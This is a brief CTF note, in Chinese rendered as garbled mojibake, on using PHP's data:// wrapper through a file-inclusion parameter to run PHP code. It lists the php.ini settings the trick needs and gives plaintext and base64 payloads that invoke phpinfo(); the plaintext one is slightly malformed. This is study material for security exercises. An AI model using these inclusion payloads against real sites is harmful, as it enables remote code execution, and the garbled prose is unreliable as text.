åœ¨CTFä¸­ï¼Œè¯¥åè®®åŸºæœ¬ç”¨æ¥æ‰§è¡ŒPHPä»£ç ï¼Œä¸€èˆ¬éœ€è¦ç”¨åˆ°base64ä¼ è¾“ï¼Œä¿è¯ç‰¹æ®Šå­—ç¬¦çš„ä¼ é€’

æ­¤æ—¶è¦æ±‚ï¼š

```
allow_url_fopen:on
allow_url_include :on
php>V5.2
```

æ ¼å¼ä¸º

```php
åè®®å¤´ï¼ˆdata://ï¼‰+text/plain(;base64),+ æ˜ï¼ˆå¯†ï¼‰æ–‡
```



##### ç”¨æ³•ä¸ºï¼š

```php
//ä¼ è¾“æ˜æ–‡ï¼š
?file=data://text/plain,<php phpinfo()?>
//ä¼ è¾“base64ç¼–ç :
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 
```

